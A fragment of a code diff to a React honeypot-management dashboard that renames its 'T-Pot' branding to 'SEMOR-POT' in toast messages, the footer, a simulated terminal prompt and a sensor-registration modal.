                               <td className="p-4 text-center" onClick={(e) => e.stopPropagation()}>
                                 <button
                                   onClick={() => {
-                                    showToast(`發送對接協議：正向 T-Pot IDS 調用主機封包庫 [ID: ${item.id}] ...`, 'info');
+                                    showToast(`發送對接協議：正向 SEMOR-POT IDS 調用主機封包庫 [ID: ${item.id}] ...`, 'info');
                                     setTimeout(() => {
                                       const content = `Captured PCAP Header: ${item.rule}\nTimestamp: ${item.time}\nSource IP Address: ${item.ip}\nPacket Size: ${item.size}\nBytes Stream: [00 ff c2 e6 a9 eb bd 92 88 a1 10 f4 1c 38 dd f2 aa aa]\nAnalysis status: READY for Wireshark Inquest.`;
                                       const element = document.createElement("a");
@@ -4022,7 +4039,7 @@ export default function HoneypotManagerView() {
       {/* FOOTER SECTION BRANDING */}
       <footer className="mt-12 text-center border-t border-gray-850 pt-6">
         <p className="text-[10px] text-gray-500 font-mono uppercase tracking-widest">
-          T-Pot Honeypot & Attack Map Management Module • Developed for Security Analyst Operations
+          SEMOR-POT Honeypot & Attack Map Management Module • Developed for Security Analyst Operations
         </p>
         <p className="text-[9px] text-gray-600 font-mono mt-1">
           Authorized to Cyber Command Tier 3 Specialist Operations Group.
@@ -4067,14 +4084,14 @@ export default function HoneypotManagerView() {
               {/* Terminal command input bar */}
               <form onSubmit={handleTerminalSubmit} className="bg-black border-t border-gray-900 p-3 flex items-center gap-2">
                 <span className="text-[#00FF66] font-mono text-xs pl-2 select-none">
-                  tpot-guest@{terminalNode.name.toLowerCase()}:~$
+                  semorpot-ops@{terminalNode.name.toLowerCase()}:~$
                 </span>
                 <input 
                   type="text"
                   value={terminalInput}
                   onChange={(e) => setTerminalInput(e.target.value)}
                   className="flex-1 bg-transparent border-none text-[#00FF66] font-mono text-xs outline-none pl-1 select-text"
-                  placeholder="輸入指令 (如 tpothelp, docker-ps, log-tail)..."
+                  placeholder="輸入指令 (如 help, docker-ps, log-tail)..."
                   autoFocus
                 />
               </form>
@@ -4084,7 +4101,7 @@ export default function HoneypotManagerView() {
         )}
       </AnimatePresence>
 
-      {/* REGISTER NEW T-POT SENSOR MODAL POPUP */}
+      {/* REGISTER NEW SEMOR-POT SENSOR MODAL POPUP */}
       <AnimatePresence>
         {showAddNodeModal && (
           <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
@@ -4096,7 +4113,7 @@ export default function HoneypotManagerView() {
             >
               <div className="bg-[#10141f] border-b border-gray-850 px-5 py-4 flex items-center justify-between">
                 <span className="text-xs font-black uppercase text-white tracking-widest font-mono">
-                  登錄全新 T-Pot 物理蜜罐節點 / 傳感器
+                  登錄全新 SEMOR-POT 物理蜜罐節點 / 傳感器
                 </span>
                 <button onClick={() => setShowAddNodeModal(false)} className="text-gray-500 hover:text-white font-mono cursor-pointer">✕</button>
               </div>
